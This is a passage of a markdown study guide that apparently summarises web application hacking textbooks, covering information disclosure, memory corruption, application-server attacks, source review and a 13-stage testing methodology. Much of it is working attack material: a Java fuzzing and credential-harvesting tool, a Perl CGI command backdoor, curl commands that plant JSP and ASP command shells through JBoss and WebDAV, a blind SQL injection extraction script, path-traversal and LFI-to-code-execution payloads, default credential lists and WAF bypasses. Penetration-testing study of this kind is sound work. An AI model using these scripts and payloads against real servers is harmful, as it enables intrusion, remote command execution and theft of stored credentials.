        "'", ";/bin/ls", "../../../../../etc/passwd", "xsstest"
    };
    int current = -1;

    public boolean nextPayload() {
        current++;
        return current < fuzzStrings.length;
    }

    public void reset() {
        current = -1;
    }

    public String getPayload() {
        return fuzzStrings[current];
    }
}

public class JAttack {
    String host = "mdsec.net";
    int port = 80;
    String method = "GET";
    String url = "/auth/498/YourDetails.ashx";

    Param[] params = new Param[] {
        new Param("SessionId", "0947F6DC9A66D29F15362D031B337797", Param.Type.COOKIE, true),
        new Param("uid", "198", Param.Type.URL, true),
    };

    // Switch between PSNumbers(190, 200, 1) for harvesting or PSFuzzStrings() for fuzzing
    PayloadSource payloads = new PSFuzzStrings();

    static final String[] extractStrings = new String[] {
        "<td>Name: </td><td>",
        "<td>Username: </td><td>",
        "<td>Password: </td><td>"
    };

    static final String[] grepStrings = new String[] {
        "error", "exception", "illegal", "quotation", "not found", "xsstest"
    };

    int currentParam = 0;

    boolean nextRequest() {
        if (currentParam >= params.length)
            return false;
        if (!params[currentParam].attack) {
            currentParam++;
            return nextRequest();
        }
        if (!payloads.nextPayload()) {
            payloads.reset();
            currentParam++;
            return nextRequest();
        }
        return true;
    }

    String buildRequest() {
        StringBuffer urlParams = new StringBuffer();
        StringBuffer cookieParams = new StringBuffer();
        StringBuffer bodyParams = new StringBuffer();

        for (int i = 0; i < params.length; i++) {
            String value = (i == currentParam) ? payloads.getPayload() : params[i].value;
            if (params[i].type == Param.Type.URL)
                urlParams.append(params[i].name + "=" + value + "&");
            else if (params[i].type == Param.Type.COOKIE)
                cookieParams.append(params[i].name + "=" + value + "; ");
            else if (params[i].type == Param.Type.BODY)
                bodyParams.append(params[i].name + "=" + value + "&");
        }

        StringBuffer req = new StringBuffer();
        req.append(method + " " + url);
        if (urlParams.length() > 0)
            req.append("?" + urlParams.substring(0, urlParams.length() - 1));
        req.append(" HTTP/1.0\r\nHost: " + host);
        if (cookieParams.length() > 0)
            req.append("\r\nCookie: " + cookieParams.toString());
        if (bodyParams.length() > 0) {
            req.append("\r\nContent-Type: application/x-www-form-urlencoded");
            req.append("\r\nContent-Length: " + (bodyParams.length() - 1));
            req.append("\r\n\r\n");
            req.append(bodyParams.substring(0, bodyParams.length() - 1));
        } else {
            req.append("\r\n\r\n");
        }
        return req.toString();
    }

    String issueRequest(String req) throws UnknownHostException, IOException {
        Socket socket = new Socket(host, port);
        OutputStream os = socket.getOutputStream();
        os.write(req.getBytes());
        os.flush();

        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        StringBuffer response = new StringBuffer();
        String line;
        while (null != (line = br.readLine()))
            response.append(line);
        os.close();
        br.close();
        socket.close();
        return response.toString();
    }

    String parseResponse(String response) {
        StringBuffer output = new StringBuffer();
        output.append(response.split("\\s+", 3)[1] + "\t");
        output.append(Integer.toString(response.length()) + "\t");

        for (String grep : grepStrings)
            if (response.indexOf(grep) != -1)
                output.append(grep + "\t");

        for (String extract : extractStrings) {
            int from = response.indexOf(extract);
            if (from == -1)
                continue;
            from += extract.length();
            int to = response.indexOf("<", from);
            if (to == -1)
                to = response.length();
            output.append(response.subSequence(from, to) + "\t");
        }
        return output.toString();
    }

    void doAttack() {
        System.out.println("param\tpayload\tstatus\tlength\tdetails");
        String output = null;
        while (nextRequest()) {
            try {
                output = parseResponse(issueRequest(buildRequest()));
            } catch (Exception e) {
                output = e.toString();
            }
            System.out.println(params[currentParam].name + "\t" + payloads.getPayload() + "\t" + output);
        }
    }

    public static void main(String[] args) {
        new JAttack().doAttack();
    }
}
```

Compile and run on Ubuntu 24.04:
```bash
javac JAttack.java && java JAttack
```

---

## Chapter 15: Exploiting Information Disclosure

### Core Summary
* **Exploiting Error Messages:**
  * **Script Error Messages:** VBScript/PHP runtime errors reveal line numbers and data types (e.g., `Type mismatch` confirms numeric casting, allowing you to skip string-based payloads).
  * **Stack Traces:** Reveal exact library versions (e.g., `.NET Framework Version: 1.1.4322.2300`), internal class/method hierarchies, and line numbers.
  * **Informative Debug Messages:** Dump session state variables, internal database hostnames, and encryption keys.
  * **Server & Database Messages:**
    * *XSS & Header Injection in Error Messages:* E.g., Tomcat's `HttpServletResponse.sendError()` reflects user input directly in the HTTP `500` status reason phrase (`HTTP/1.1 500 General Error Accessing <input>`).
    * *Decryption Oracles in Error Messages:* Swapping encrypted parameters (e.g., passing the encrypted `grouphome` value into the `dbid` parameter) causes an Oracle TNS listener error that prints the decrypted value (`docs/londonoffice/2010/general`) in the error message!
* **Using Public Information:** Search Google and code repositories for exact error string literals (`"unable to retrieve" filetype:php` or `lang:php`).
* **Engineering Informative Error Messages:** Force SQL type conversion errors (`' and 1=(select password from users where uid=1)--`) or throw a custom `RuntimeException(output)` from an injected Java user-defined function in the database so the OS command output is returned inside the stack trace!
* **Using Inference:** Measure subtle response timing differences to infer cached/active vs. dormant bank accounts, valid usernames, or internal firewall port states.
* **Preventing Information Leakage:** Configure custom error pages (`customErrors` in ASP.NET `Web.config`, `error-page` in Java `web.xml`, `ErrorDocument 500 /generalerror.html` in Apache `httpd.conf`), mask sensitive fields (never prefill password fields in HTML), and strip `Server` banners.

---

## Chapter 16: Attacking Native Compiled Applications

### Core Summary
When web applications use native C/C++ CGI binaries, ISAPI DLLs, or hardware device interfaces, classic memory corruption vulnerabilities arise:
1. **Buffer Overflow Vulnerabilities:**
   * **Stack Overflows:** Unbounded copies (`strcpy(_username, username)`) overwrite the saved return address on the stack.
   * **Heap Overflows:** Overwriting adjacent heap control structures (doubly linked list forward/backward pointers) to achieve an arbitrary 4-byte pointer overwrite (`DWORD SHOOT`) when the block is freed.
   * **Off-by-One Vulnerabilities:** Writing 1 byte past a buffer (overwriting the least significant byte of the saved frame pointer `EBP`), or filling a fixed buffer via `strncpy` without leaving room for a null terminator (`\0`), causing the string to bleed into adjacent memory! In the book's `formRelay.cgi` example, sending 4096 bytes eliminated the null byte and caused the server to echo back the *previous user's* POST parameters (including `strUsername` and `strPassword`)!
   * **Detection Payloads:** Send strings of lengths `1100`, `4200`, and `33000` to one parameter at a time, preserving allowed character sets.
2. **Integer Vulnerabilities:**
   * **Integer Overflows:** `unsigned short len = strlen(username) + 1;` wraps around to `0` when `strlen` is 65,535 (0xffff + 1 = 0), causing `malloc(0)` followed by a massive heap overflow.
   * **Signedness Errors:** Comparing a signed `int len` against `if (len < 32)` passes when `len` is negative, which is then implicitly cast to a huge `unsigned int` in `strncpy(_username, username, len)`.
   * **Detection Payloads (Hex & Decimal Boundary Values):**
     * `0x7f` (127) and `0x80` (128)
     * `0xff` (255) and `0x100` (256)
     * `0x7fff` (32767) and `0x8000` (32768)
     * `0xffff` (65535) and `0x10000` (65536)
     * `0x7fffffff` (2147483647) and `0x80000000` (2147483648)
     * `0xffffffff` (4294967295) and `0x0` (0)
3. **Format String Vulnerabilities:**
   * Occurs when user input is passed directly as the format string to `printf(userinput)` or Windows `FormatMessage`.
   * **Detection Payloads (URL-encode `%` as `%25`):**
     * `%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n`
     * `%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s`
     * `%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!`
     * `%1!s!%2!s!%3!s!%4!s!%5!n!%6!s!%7!s!%8!s!%9!s!%10!s!`

---

<a id="part-vii--architecture-application-servers--source-review"></a>

**PART VII — ARCHITECTURE, APPLICATION SERVERS & SOURCE REVIEW**
*Chapters 17–19 — tiered/shared-hosting architecture risk, application-server hardening, and manual source auditing.*

---

## Chapter 17: Attacking Application Architecture

### Core Summary
1. **Attacking Tiered Architectures:**
   * **Exploiting Trust Relationships:** If the database tier trusts a single high-privileged account used by the application tier, any SQLi compromises the entire database.
   * **Subverting Other Tiers:**
     * *Accessing Decryption Functions:* If encryption keys and decryption routines reside in the database tier, compromising the DB tier defeats data-at-rest encryption.
     * *Extracting MySQL Data via File Read:* On a single-box LAMP stack, a path traversal vulnerability in the web app (`?css=../../../../../../../../var/lib/mysql/mysql/user.MYD`) directly reads raw MySQL database files from disk, bypassing DB authentication!
     * *Escalating Local File Inclusion (LFI) via PHP Session Files:* PHP stores session data in cleartext files at `/var/lib/php5/sess_<PHPSESSID>` (or `/var/lib/php/sessions/sess_<PHPSESSID>` on Ubuntu 24.04). By setting your profile nickname to `<?php passthru(id); ?>` and requesting `?country=../../../../../../../../var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7%00`, the LFI executes your session file as PHP code!
2. **Shared Hosting, ASPs, and Cloud Computing:**
   * **Attacking Access Mechanisms:** Insecure FTP/ODBC protocols or vulnerable customer management portals.
   * **Deliberate Backdoors & Cross-App Attacks:** A malicious customer on a shared host uploads a Perl CGI shell (`backdoor.pl`) running as the shared `apache` / `www-data` user to read other customers' files and database credentials.
   * **Cloud-Specific Risks:** Cloned virtual machines sharing identical PRNG entropy seeds, legacy internal management tools ported to web interfaces without RBAC, persistent device tokens, and same-origin JAR/HTML uploads in shared cloud storage.

### Perl CGI Backdoor Script (from Chapter 17)
```perl
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html("");
if (param()){
    my $command = param("cmd");
    $command=`$command`;
    print "$command\n";
} else {
    print start_form(); textfield("command");
}
print end_html;
```

---

## Chapter 18: Attacking the Application Server

### Core Summary & Server Exploits
1. **Vulnerable Server Configuration:**
   * **Default Credentials:**
     * *Apache Tomcat:* `admin:<blank>`, `tomcat:tomcat`, `root:root`
     * *Sun JavaServer / Netscape Enterprise Server:* `admin:admin`
     * *Compaq Insight Manager:* `administrator:administrator`, `anonymous:<blank>`, `user:user`, `operator:operator`, `user:public`
     * *Zeus:* `admin:<blank>`
   * **Default Content & Powerful Functions:**
     * `phpinfo.php` (leaks environment/paths), Jetty `/test/jsp/dump.jsp` (XSS), Tomcat `Sessions Example` (lets users read/write arbitrary session variables).
     * *JBoss JMX Console (`jmx-console`):* Invoke `DeploymentFileRepository.store()` to write a backdoor `.war` (`cmdshell.war` containing `<%Runtime.getRuntime().exec(request.getParameter("c"));%>`). If `GET` and `POST` are restricted by `web.xml`, bypass the restriction by sending a `HEAD` request!
     * *Oracle PL/SQL Gateway (`/pls/dad/`):* Execute `SYS.OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+*+FROM+users` or E-Business Suite `icx_define_pages.DispPageDialog`.
   * **Directory Listings & WebDAV Methods:** Test `OPTIONS`, `PUT`, `MOVE`, `COPY`, `DELETE`, `PROPFIND`, `SEARCH` using `davtest.pl` or `cadaver`. Upload a `.txt` file via `PUT` and rename it to `.asp`/`.jsp`/`.php` via `MOVE`.
   * **Application Server as a Proxy:** Send `GET http://external-or-internal-host:80/ HTTP/1.0` or `CONNECT 127.0.0.1:22 HTTP/1.0`.
   * **Misconfigured Virtual Hosting:** Send `GET / HTTP/1.0` with no `Host` header, the server's raw IP address in the `Host` header, or an arbitrary `Host` header to hit the default virtual host.
2. **Vulnerable Server Software:**
   * **The .NET Padding Oracle (MS10-070):** Exploits PKCS #5 padding validation in CBC-encrypted tokens (`.NET` ViewState and `ScriptResource.axd?d=...`). Modifying the penultimate ciphertext block (or IV) byte-by-byte until the server stops returning `500 Internal Server Error` (meaning the decrypted last byte equals valid padding `0x01`) reveals P(n) = C'(n-1) XOR 0x01! Allows full decryption and arbitrary encryption (e.g., downloading `web.config` via `ScriptResource.axd`).
   * **Memory Management Flaws:** Apache `mod_isapi` dangling pointer, IIS `.printer` and `.ida`/`.idq` overflows, Apache `mod_proxy` chunked encoding overflow, WebDAV overflows.
   * **Encoding & Canonicalization Flaws:**
     * *Apple iDisk:* `http://idisk.mac.com/user-Public/%2E%2E%2FPRIVATE.txt`
     * *Ruby WEBrick:* `/..%5c..%5c..%5c..%5c/boot.ini`
     * *Tomcat / JVM UTF-8:* `/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
     * *Allaire JRun Directory Listing:* `/dir/%3f.jsp`
     * *IIS Unicode & Double Decode:* `/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir` and `/scripts/..%255c../winnt/system32/cmd.exe?/c+dir`
     * *IIS 6.0 WebDAV Auth Bypass:* `GET /prote%c0%afcted/protected.zip` with `Translate: f` or `PROPFIND /protec%c0%afted/`
     * *Oracle PL/SQL Exclusion List Bypasses:* `/pls/dad/%0ASYS.package.proc`, `/pls/dad/S%FFS.package.proc`, `/pls/dad/"SYS".package.proc`, `/pls/dad/<<FOO>>SYS.package.proc`.
3. **Web Application Firewalls (WAFs) & Bypass Techniques:**
   * Avoid textbook strings (`/etc/passwd`, `<script>`, `alert()`). Read `/var/log/syslog` instead.
   * Move parameters between URL query string, `POST` body, and `Cookie` header (in ASP.NET, `Request.Params["foo"]` checks QueryString, Form, *and* Cookies!).
   * Use HTTP Parameter Pollution (HPP) to split payloads across multiple same-named parameters (`?p1=<scr&p1=ipt>`), which ASP.NET concatenates with a comma (`<scr,ipt>`).

### Ubuntu 24.04 Server & WebDAV Testing Commands
```bash
# 1. Exploit JBoss JMX Console using HEAD method bypass to deploy a JSP command shell
curl -i -X HEAD "http://target.com:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=cmdshell.war&argType=java.lang.String&arg1=cmdshell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=boolean&arg4=True"

# 2. Test WebDAV PUT and MOVE methods using curl on Ubuntu 24.04
curl -i -X PUT http://target.com/public/shell.txt -d '<% eval request("cmd") %>'
curl -i -X MOVE http://target.com/public/shell.txt -H "Destination: http://target.com/public/shell.asp"

# 3. Test for Open Forward Proxy via GET and CONNECT
curl -i -x http://target.com:80 http://127.0.0.1:80/
curl -i -p -x http://target.com:80 https://127.0.0.1:443/

# 4. Test Virtual Host Misconfigurations
curl -i http://target.com/ -H "Host: 192.168.1.100"
curl -i http://target.com/ -H "Host: bogus.invalid"
curl -i --http1.0 http://target.com/ -H "Host:"
```

---

## Chapter 19: Finding Vulnerabilities in Source Code

### Core Summary & Multi-Language Audit Cheat Sheet
* **Threefold Code Review Methodology:**
  1. Trace user-controllable data from entry points to sinks.
  2. Search the codebase for vulnerability signatures (`"SELECT `, `" WHERE `, `strcpy`, etc.) and developer comments (`bug`, `problem`, `bad`, `hope`, `todo`, `fix`, `overflow`, `crash`, `inject`, `xss`, `trust`).
  3. Line-by-line review of security-critical mechanisms.

#### Complete Multi-Language Source Code Audit Matrix (Chapter 19)

| Category | Java Platform (J2EE) | ASP.NET (C# / VB) | PHP | Perl (`CGI.pm`) |
| :--- | :--- | :--- | :--- | :--- |
| **User Input APIs** | `getParameter`, `getParameterValues`, `getParameterMap`, `getQueryString`, `getHeader`, `getCookies`, `getRequestURI`, `getRequestURL`, `getInputStream`, `getReader`, `getMethod`, `getServerName`, `getRemoteUser` | `Request.Params`, `Request.Item`, `Request.Form`, `Request.QueryString`, `Request.ServerVariables`, `Request.Headers`, `Request.Url`, `Request.RawUrl`, `Request.UrlReferrer`, `Request.Cookies`, `Request.Files`, `Request.InputStream`, `Request.UserAgent` | `$_GET`, `$_POST`, `$_COOKIE`, `$_REQUEST`, `$_FILES`, `$_SERVER['QUERY_STRING']`, `$_SERVER['REQUEST_URI']`, `$_SERVER['PHP_SELF']`, `$_SERVER['HTTP_*']`, `$GLOBALS` (plus uninitialized vars if `register_globals=On`) | `param`, `param_fetch`, `Vars`, `cookie`, `raw_cookie`, `self_url`, `url`, `query_string`, `referer`, `user_agent`, `http`, `ReadParse` (`%in`) |
| **Session Storage APIs** | `HttpSession`: `setAttribute`, `getAttribute`, `putValue`, `getValue` | `Session["key"]`, `Profile.prop`, `HttpSessionState` (`Add`, `Item`) | `$_SESSION['key']`, `$HTTP_SESSION_VARS`, `session_register` | `CGISession.pm`: `$q->session_data()` |
| **File Access APIs (Path Traversal / RFI / LFI)** | `java.io.File`, `FileInputStream`, `FileOutputStream`, `FileReader`, `FileWriter` | `System.IO.File.*`, `FileStream`, `StreamReader`, `StreamWriter` | `fopen`, `readfile`, `file`, `fpassthru`, `gzopen`, `copy`, `rename`, `unlink`, `file_get_contents`, `file_put_contents`, `parse_ini_file`, `include`, `include_once`, `require`, `require_once`, `virtual` | `open`, `sysopen` (Note: `open` with leading/trailing `\|` executes shell commands!) |
| **Unsafe DB APIs (SQLi)** | `Statement.execute`, `Statement.executeQuery` (with string concatenation) | `SqlCommand`, `OleDbCommand`, `OdbcCommand` (with concatenated `CommandText`) | `mysql_query`, `mssql_query`, `pg_query` | `selectall_arrayref`, `do` |
| **Safe DB APIs (Prepared Statements)** | `Connection.prepareStatement` + `setString`, `setInt`, etc. | `Command.Parameters.Add(new SqlParameter("@p", ...))` | `mysqli->prepare`, `stmt->bind_param`, `odbc_prepare` | `$dbh->prepare` + `$sth->execute($var)` |
| **Dynamic Code Execution** | N/A natively (check DB Java wrappers) | VBScript: `Eval`, `Execute`, `ExecuteGlobal` | `eval`, `call_user_func`, `create_function`, `preg_replace` (with `/e` modifier), `$var()` | `eval` |
| **OS Command Execution** | `Runtime.getRuntime().exec` (does not parse shell metacharacters directly unless shell is invoked) | `Process.Start`, `ProcessStartInfo` | `exec`, `passthru`, `popen`, `proc_open`, `shell_exec`, `system`, backticks `` ` `` | `system`, `exec`, `qx`, backticks `` ` ``, `open(FH, "\|cmd")` |
| **URL Redirection** | `HttpServletResponse`: `sendRedirect`, `setStatus`, `addHeader` | `Response.Redirect`, `StatusCode`, `AddHeader`, `Server.Transfer` | `http_redirect`, `header("Location: ...")`, `setResponseCode` | `$q->redirect` |
| **Sockets (SSRF)** | `java.net.Socket` | `System.Net.Sockets.Socket.Connect` | `socket_connect`, `fsockopen`, `pfsockopen` | `socket`, `connect` |
| **Config File & Options** | `web.xml` (`login-config`, `security-constraint`, `session-config`, `error-page`, `listings`, `debug`) | `Web.config` (`httpCookies`, `sessionState`, `compilation debug`, `customErrors`, `httpRuntime`) | `php.ini` (`register_globals`, `safe_mode`, `magic_quotes_gpc`, `allow_url_fopen`, `allow_url_include`, `display_errors`) | `#!/usr/bin/perl -T` (Taint mode) |

### Ubuntu 24.04 Source Code Grepping Commands
```bash
# Search a codebase for developer security comments on Ubuntu 24.04
grep -rnEi "(bug|problem|bad|hope|todo|fix|overflow|crash|inject|xss|trust)" /path/to/source/

# Search for concatenated SQL queries across Java/C#/PHP source files
grep -rnEi '"(SELECT|INSERT|UPDATE|DELETE| AND| OR| WHERE| ORDER BY) ' /path/to/source/

# Search PHP source code for dangerous command, file inclusion, and eval sinks
grep -rnE "(exec|passthru|shell_exec|system|popen|proc_open|eval|preg_replace|include|require)\s*\(" /path/to/php_src/
```

---

<a id="part-viii--toolkit--methodology"></a>

**PART VIII — TOOLKIT & METHODOLOGY**
*Chapters 20–21 — the tester's toolkit and the complete 13-stage engagement methodology.*

---

## Chapter 20: A Web Application Hacker's Toolkit

### Core Summary
* **Web Browsers & Extensions:** IE, Firefox (FoxyProxy, LiveHTTPHeaders, Web Developer Toolbar, Firebug, Tamper Data), and Chrome.
* **Integrated Testing Suites (Burp Suite, OWASP ZAP, WebScarab):**
  * **Intercepting Proxy:** Sits on `127.0.0.1:8080`, intercepts HTTP/HTTPS, and dynamically generates per-host SSL certificates signed by the suite's CA certificate.
  * **Working with Non-Proxy-Aware Thick Clients:** Redirect target domain in `/etc/hosts` to `127.0.0.1`, set up invisible proxy listeners on local ports `80`/`443`, and configure internal hostname resolution in Burp (`Options -> Connections -> Hostname Resolution`) to forward traffic to the real IP.
  * **Other Suite Components:** Spider, Fuzzer (Intruder), Active/Passive Vulnerability Scanner, Manual Request Repeater, Token Randomness Sequencer, Decoder, and Response Comparer.
* **Standalone Vulnerability Scanners:** Excel at signature-based flaws (reflected XSS, error-based/time-based SQLi, basic path traversal, directory listings) but **cannot reliably detect** broken access controls, business logic flaws, semantic parameter tampering, or complex multi-stage authentication flaws. Best used in **user-directed mode** rather than blind automation.

### Ubuntu 24.04 Custom Scripts & Toolkit Commands (from Chapter 20)

#### 1. Perl Blind Error-Based SQLi Extractor (`sql.pl` from Chapter 20)
```perl
#!/usr/bin/perl
# File: sql.pl — Iteratively extracts all rows of a column via MS-SQL conversion errors
# Usage on Ubuntu 24.04: perl sql.pl SELECT column_name FROM table_name
use HTTP::Request::Common;
use LWP::UserAgent;

$ua = LWP::UserAgent->new();
my $col = @ARGV[1];
my $from_stmt = @ARGV[3];
if ($#ARGV != 3) {
    print "usage: perl sql.pl SELECT column FROM table\n";
    exit;
}

my $test = "";
while(1) {
    $payload = "foo' or (1 in (select max($col) from $from_stmt $test))--";
    my $req = POST "http://mdsec.net/addressbook/32/Default.aspx",
        [__VIEWSTATE => '', Name => $payload, Email => 'john@test.com', Phone => '12345',
         Search => 'Search', Address => '1 High Street', Age => '30'];
    my $resp = $ua->request($req);
    my $content = $resp->as_string;
    if ($content =~ /nvarchar value '(.*)'/) {
        print "$1\n";
    } else {
        exit;
    }
    $test = "where $col < '$1'";
}
```

#### 2. Bash & Curl Page Title Harvester (from Chapter 20)
```bash
#!/bin/bash
# Harvests <title> tags across PageNo IDs 10 to 40
for i in $(seq 10 40); do
  echo -n "$i : "
  curl -s "http://mdsec.net/app/ShowPage.ashx?PageNo=$i" \
    | grep -Po "<title>(.*)</title>" \
    | sed 's/<title>\(.*\)<\/title>/\1/'
done
```

#### 3. Stunnel SSL Wrapper for Non-SSL Tools on Ubuntu 24.04
```bash
# Wrap local cleartext port 88 into an outbound SSL tunnel to wahh-app.com:443
# On Ubuntu 24.04, create a quick stunnel4 config file and launch it:
cat << 'EOF' > stunnel_client.conf
client = yes
foreground = yes
[https_wrapper]
accept = 127.0.0.1:8888
connect = wahh-app.com:443
EOF

stunnel4 stunnel_client.conf
```

---

## Chapter 21: A Web Application Hacker's Methodology (Complete 13-Stage Checklist)

Use this complete, structured 13-stage blueprint during penetration tests:

1. **Map the Application's Content**
   * `1.1` Explore visible content via user-directed spidering (with JS/cookies enabled and disabled).
   * `1.2` Consult public resources (Google `site:`, `link:`, `filetype:`, Wayback Machine, WSDL files).
   * `1.3` Discover hidden content (brute-force dirs/files, infer naming conventions, check `.bak`, `.old`, `.inc`, `.tmp`, `.DS_Store`).
   * `1.4` Discover default content (`nikto`, test IP in `Host` header, fuzz `User-Agent` strings).
   * `1.5` Enumerate identifier-specified functions (`?action=editUser`, `?func=A21`).
   * `1.6` Test for debug parameters (`debug=true`, `test=1`, `source=on`).
2. **Analyze the Application**
   * `2.1` Identify core functionality, security mechanisms, and peripheral functions.
   * `2.2` Identify all data entry points (URL paths, query strings, POST bodies, cookies, `Referer`, `User-Agent`, `X-Forwarded-For`, out-of-band channels).
   * `2.3` Identify client-side and server-side technologies (banners, `httprint`, session token names, file extensions).
   * `2.4` Map the attack surface and prioritize high-risk targets.
3. **Test Client-Side Controls**
   * `3.1` Test transmission of data via the client (hidden fields, cookies, preset URL params, opaque data, ASP.NET `__VIEWSTATE`).
   * `3.2` Test client-side input controls (`maxlength`, JS validation, `disabled="true"` elements).
   * `3.3` Test browser extension components (deserialize Java/AMF/WCF traffic, decompile `.class`/`.swf`/`.xap`, attach runtime debuggers `JavaSnoop`/`Silverlight Spy`, audit ActiveX controls with COMRaider).
4. **Test the Authentication Mechanism**
   * `4.1` Understand the mechanism and locate all auth-related endpoints.
   * `4.2` Test password quality rules and test for incomplete validation (truncation, case-insensitivity).
   * `4.3` Test for username enumeration (error differences, HTML layout differences, timing differences).
   * `4.4` Test resilience to password guessing (account lockout, cookie/session counters).
   * `4.5` Test account recovery functions (secret questions, hints, recovery URL predictability).
   * `4.6` Test "Remember Me" functions (persistent cookies).
   * `4.7` Test impersonation functions and check for backdoor passwords.
   * `4.8` Test username uniqueness in self-registration.
   * `4.9` Test predictability of autogenerated usernames/passwords.
   * `4.10` Check for unsafe transmission of credentials (HTTP login pages, URL params, cookies).
   * `4.11` Check for unsafe out-of-band distribution of credentials and activation URLs.
   * `4.12` Test for insecure credential storage (unsalted hashes, rainbow tables).
   * `4.13` Test for logic flaws (fail-open conditions on missing parameters, multistage login bypasses, random challenge cycling).
   * `4.14` Exploit vulnerabilities using breadth-first automated attacks.
5. **Test the Session Management Mechanism**
   * `5.1` Identify which items actually function as session tokens and which bytes are validated.
   * `5.2` Test tokens for meaning (structured data, hex/Base64/XOR encoding of usernames/roles).
   * `5.3` Test tokens for predictability (concealed sequences, time dependencies, weak PRNGs via Burp Sequencer, ECB block shuffling, CBC bit-flipping).
   * `5.4` Check for insecure transmission of tokens (missing `secure` flag, HTTP-to-HTTPS upgrade without token regeneration, mixed content).
   * `5.5` Check for disclosure of tokens in logs and `Referer` headers.
   * `5.6` Check mapping of tokens to sessions (concurrent logins, static tokens).
   * `5.7` Test session termination (server-side idle timeout and server-side invalidation upon logout).
   * `5.8` Check for session fixation.
   * `5.9` Check for CSRF and UI Redress (Clickjacking).
   * `5.10` Check cookie `domain` and `path` scope.
6. **Test Access Controls**
   * `6.1` Understand vertical, horizontal, and context-dependent requirements.
   * `6.2` Test with multiple accounts (compare site maps in Burp Suite).
   * `6.3` Test with limited access (predict resource identifiers/IDOR, decompile client components).
   * `6.4` Test for insecure access control methods (`admin=true`, `Referer` checks, `HEAD` verb tampering).
7. **Test for Input-Based Vulnerabilities (Fuzzing All Parameters)**
   * `7.1` Fuzz all request parameters with universal test strings and grep for errors/reflections.
   * `7.2` Test for SQL Injection (`UNION`, error-based, boolean-blind, time-based, OOB, second-order).
   * `7.3` Test for XSS (Reflected, Stored, DOM), HTTP Header Injection, and Open Redirection.
   * `7.4` Test for OS Command Injection (`ping` delays, redirection `>`, argument injection).
   * `7.5` Test for Path Traversal (read/write, encoding bypasses, null bytes).
   * `7.6` Test for Dynamic Script Injection (`echo 111111`, `phpinfo()`).
   * `7.7` Test for Remote & Local File Inclusion.
8. **Test for Function-Specific Input Vulnerabilities**
   * `8.1` Test for SMTP Header and Command Injection.
   * `8.2` Test for Native Software Vulnerabilities (buffer overflows, integer overflows/signedness, format strings).
   * `8.3` Test for SOAP Injection (`</foo>` vs `<foo></foo>`).
   * `8.4` Test for LDAP Injection (`*`, `))))))))))`, `)(cn=*`, `*%00`).
   * `8.5` Test for XPath Injection (`' or count(parent::*[position()=1])>0 or 'a'='b`).
   * `8.6` Test for Back-End HTTP Request Injection (SSRF, HPI, HPP).
   * `8.7` Test for XML External Entity (XXE) Injection.
9. **Test for Logic Flaws**
   * `9.1` Identify key attack surface.
   * `9.2` Test multistage processes (forced browsing out of sequence, submitting parameters to wrong stages).
   * `9.3` Test handling of incomplete input (removing parameter name/value pairs).
   * `9.4` Test trust boundaries (session variable reuse across anonymous and authenticated features).
   * `9.5` Test transaction logic (negative quantities/transfers, bulk discount manipulation).
10. **Test for Shared Hosting Vulnerabilities**
    * `10.1` Test segregation in shared infrastructures (customer access mechanisms, cross-account file/shell access).
    * `10.2` Test segregation between ASP-hosted applications and shared DB components.
11. **Test for Application Server Vulnerabilities**
    * `11.1` Test for default credentials on admin interfaces.
    * `11.2` Test for default content and powerful functions (`jmx-console`, PL/SQL gateway, Tomcat manager).
    * `11.3` Test for dangerous HTTP & WebDAV methods (`PUT`, `MOVE`, `DELETE`, `PROPFIND`).
    * `11.4` Test for open forward/reverse proxy functionality (`GET` full URL and `CONNECT`).
    * `11.5` Test for virtual hosting misconfigurations.
    * `11.6` Test for web server software bugs (.NET Padding Oracle, encoding/canonicalization traversal).
    * `11.7` Test and bypass Web Application Firewalls (WAFs).
12. **Miscellaneous Checks**
    * `12.1` Check client-side JS for DOM-based XSS and redirection sinks.
    * `12.2` Check for local privacy vulnerabilities (persistent cookies, missing `no-cache` headers, `autocomplete`, Flash LSOs, Silverlight/HTML5 storage).
    * `12.3` Check for weak SSL/TLS ciphers.
    * `12.4` Check `/crossdomain.xml`, `/clientaccesspolicy.xml`, and CORS `Access-Control-Allow-Origin` headers.
13. **Follow Up Any Information Leakage**
    * `13.1–13.5` Harvest and research all verbose error messages, stack traces, and decryption oracles.

---

<a id="appendices"></a>

**APPENDICES**
*Bonus network/host material, a cross-chapter quick-reference command index, and a glossary.*

---

## Appendix A: Bonus Reference — *Hacking Exposed* (Network, UNIX, Linux Password Cracking & Windows/IIS) Commands for Ubuntu 24.04

To ensure 100% coverage of the *Hacking Exposed* chapters from your earlier upload, here are all the summaries and commands from those chapters adapted for Ubuntu 24.04:

### 1. Footprinting (Chapter 1 of *Hacking Exposed*)
* **Scope & Open Source Recon:** Mirror target websites locally for offline HTML comment (`<!-- ... -->`) inspection using `wget`. Search SEC EDGAR filings (10-Q / 10-K) for newly acquired subsidiaries.
* **Network Enumeration (Whois):** Query Registrar, Organizational, Domain, Network (ARIN/RIPE/APNIC), and Point of Contact (POC) databases.
* **DNS Interrogation:** Perform zone transfers (`AXFR`) to dump internal hostnames, `A` records, `MX` records, and `HINFO` records, then filter for target OSes (`solaris`) or `test` systems.
* **Network Reconnaissance (Traceroute):** Map border routers and firewalls. Bypass UDP traceroute blocks by forcing a fixed destination port like UDP/TCP port 53 (DNS).

```bash
# Mirror a target website locally for offline HTML comment analysis
wget -r -p -k http://www.target.com
grep -rn "<!--" www.target.com/

# Whois queries (Registrar, Domain, ARIN Network Block, and Handle/POC)
whois -h whois.crsnic.net "acme."
whois -h whois.networksolutions.com "acme.net"
whois -h whois.arin.net "10.10.10.0"

# DNS Zone Transfers (AXFR) and MX Record Enumeration on Ubuntu 24.04
dig @10.10.10.2 acme.net axfr > /tmp/zone_out
grep -i "solaris" /tmp/zone_out | wc -l
grep -i "test" /tmp/zone_out | wc -l
